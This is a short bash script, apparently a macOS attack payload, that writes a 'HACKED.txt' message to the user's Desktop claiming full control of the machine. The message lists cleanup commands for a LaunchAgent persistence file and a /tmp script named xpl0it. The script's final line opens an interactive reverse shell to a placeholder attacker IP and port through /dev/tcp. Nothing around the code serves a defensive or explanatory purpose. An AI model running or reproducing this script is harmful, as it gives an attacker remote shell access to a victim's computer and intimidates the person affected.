#!/bin/bash
printf "Well...\nIt's Over.\nAs you read this, know that I have complete and total control of your machine.\n\n\n\n\n" > ~/Desktop/HACKED.txt
printf "Cleanup Instructions\n\nRun These Commands:\n" >> ~/Desktop/HACKED.txt
printf "rm ~/Library/LaunchAgents/com.xpl0it.plist\nrm /tmp/xpl0it.sh\n" >> ~/Desktop/HACKED.txt
printf "launchctl unload -w ~/Library/LaunchAgents/com.xpl0it.plist\n" >> ~/Desktop/HACKED.txt
bash -i >& /dev/tcp/attackerip/attackerport 0>&1